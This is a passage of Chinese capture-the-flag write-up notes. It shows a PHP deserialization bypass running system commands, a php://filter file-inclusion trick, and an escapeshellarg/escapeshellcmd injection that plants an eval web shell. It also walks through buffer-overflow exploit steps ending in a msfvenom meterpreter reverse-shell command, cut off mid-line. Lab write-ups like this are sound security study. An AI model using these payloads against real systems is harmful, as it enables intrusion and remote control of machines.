var $func = "date";
function __destruct() {
if ($this->func != "") {
echo gettime($this->func, $this->p);
}
}
}
$func = $_REQUEST["func"];
$p = $_REQUEST["p"];
 
if ($func != null) {
$func = strtolower($func);
if (!in_array($func,$disable_fun)) {
echo gettime($func, $p);
}else {
die("Hacker...");
}
}
?>
```
可以看到其过滤了很多可以利用的函数，且调用的函数返回字符串类型才会回显，不然回显空。
而其中有一个类Test，可以利用这个类直接绕过上面的所有过滤。
思路为：将类参数func改为要执行的函数，p为参数，将其序列化，post请求里func请求unserialize函数，p传递序列化后的Test对象。
```php
<?php
function gettime($func, $p) {
$result = call_user_func($func, $p);
$a= gettype($result);
if ($a == "string") {
return $result;
} else {return "";}
}
 
class Test {
var $p = "参数";
var $func = "函数";
function __destruct() {
if ($this->func != "") {
echo gettime($this->func, $this->p);
}
}
}
$a = new Test();
echo serialize($a)
?>
```
尝试：传递system与ls
`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}`
显示只有bg.jpg与index.php
后面ls连续使用了../来看其他目录，并没有明显的flag存在迹象。
使用find函数：
`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}`
找到目录：
`/tmp/flagoefiu4r93`
打开文件拿到flag。
`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}`
ls找不到就直接find，不能傻乎乎的../../../../../../../。。。。。了
[BSidesCF 2020]Had a bad day #Include文件包含漏洞 
进入页面，可以选择woofers或者meowers,选择后会显示猫猫狗狗
看到url有参数category，传别的字符串提示必须包含woofers或meowers。
直接传：
`category=php://filter/convert.base64-encode/resource=index`
发现是可以看到源码的，base64解码
其中的php部分：
```php
<?php
    $file = $_GET['category'];
    if(isset($file))
    {
        if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
            include ($file . '.php');
        }
        else{
            echo "Sorry, we currently only support woofers and meowers.";
        }
    }
?>
```
其过滤条件包含了index所以可以看到源码。
查看资料，伪协议是可以==嵌套使用==的。
构造：
`index.php?category=php://filter/convert.base64-encode/woofers/resource=flag`
拿到flag。
[BUUCTF 2018]Online Tool #命令执行漏洞 #RCE
进入环境，显示源码：
```php
<?php  
  
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
  
if(!isset($_GET['host'])) {    highlight_file(__FILE__);  
} else {$host = $_GET['host'];    $host = escapeshellarg($host);    $host = escapeshellcmd($host);    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);  
    echo 'you are in sandbox '.$sandbox;  
    @mkdir($sandbox);    chdir($sandbox);  
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);  
}
```
第一个部分获取了客户端的真实IP,第二个部分则通过get方法得到的参数host进行nmap扫描，并将扫描结果存放在一个文件里，并会回显路径。
第二个部分对传入的参数host进行了两步处理：
escapeshellarg以及escapeshellcmd。
关于这俩：[[PHP escapeshellarg()+escapeshellcmd() 之殇.pdf]]
这两个函数连用是有任意命令执行的风险的，在这道题里，其用在了一条Nmap扫描的系统命令里。
Nmap的后缀-oG用来将扫描结果存放到文件里。
只需要将其扫描的IP换为可执行代码（即host参数），并将其保存为php文件，即可任意命令的执行。
传递payload：
`?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
`
使用蚁剑连接，即可获取flag
[THM]Internal
扫描端口：
![[Pasted image 20240308181702.png]]
80，扫描目录：
![[Pasted image 20240308181733.png]]
递归扫描/blog:
[THM]GateKeeper
扫描端口：
![[Pasted image 20240310135657.png]]
![[Pasted image 20240310135640.png]]
开放了11个端口
开放了smb服务，rdp服务
以及31337上非常SUS的服务，扫描传输的数据会回复HELLO+数据
先枚举其smb分享
![[Pasted image 20240310205721.png]]
可以看到有Users分享，尝试匿名登录：
![[Pasted image 20240310205840.png]]
可以看到Share文件夹下的gatekeeper.exe文件
get下载下来(使用binary二进制模式下载，不然运行会出问题)
放到windows系统下运行：
![[Pasted image 20240310210224.png]]
显示等待连接，上面扫描到的31337可能就是运行了此程序
尝试使用netcat连接此端口：
![[Pasted image 20240310210545.png]]
可以看到他就是上面所扫描到的服务，且会显示其收到的数据大小
将其丢入Immunity Debugger(官网下载)，并安装mona插件(可以在github上下载)
使用脚本测试缓冲区溢出所需的字节大小
![[Pasted image 20240310211632.png]]
其在150字节时崩溃，重启程序后
使用msf生成150字节的模式字节作为payload向其发送(使用：`msf-pattern_create -l 长度`)
![[Pasted image 20240310212621.png]]
完美崩溃，在Immunity Debugger的控制台内输入`!mona findmsp -distance 150`
来查找这个重复的150字节模式
![[Pasted image 20240310213009.png]]
可以看到EIP的offset是146
接下来测试146的offset是否可以完美的覆盖掉EIP寄存器
![[Pasted image 20240310213600.png]]
发送146bytes的数据，再加4bytes的“CCCC”后缀
完美崩溃，查看寄存器EIP
![[Pasted image 20240310213721.png]]
可以看到四个“43”即"C"说明146bytes的offset是正确的
接下来测试坏字符(BADCHAR),如“\\x00”这种字符在shell代码中是无法使用的，会导致shell无法成功的执行
先设置mona插件的工作目录(接下来会用到)
`!mona config -set workingfolder c:\mona\%p`
使用mona插件生成除去"\\x00"的字节对照表：
![[Pasted image 20240310214720.png]]
同时将这个对照表复制到脚本中作为payload进行发送测试：
![[Pasted image 20240310214958.png]]
发送后崩溃，复制ESP地址：![[Pasted image 20240310215044.png]]
并在控制台中执行：
`!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 008B19E8`
来与之前生成的对照表进行比较：
![[Pasted image 20240310215240.png]]
结果是00 0a，00我们上面已经添加过了，现在把0a从对照表及脚本的对照表Payload中剔除掉(重要)
![[Pasted image 20240310215501.png]]
![[Pasted image 20240310215440.png]]
重启程序，再次执行脚本
![[Pasted image 20240310215711.png]]
崩溃，查看ESP地址：![[Pasted image 20240310215749.png]]
![[Pasted image 20240310215843.png]]
当其显示Unmodified时则说明坏字符已经被我们剔除干净
坏字符是：`\x00\x0a`
接下来使用msfvenom生成我们所需的shellcode
msfvenom -p windows/meterpreter/reverse_tcp -f c -b "\x00\x0a" LHOST=10.14.73.43 LPORT=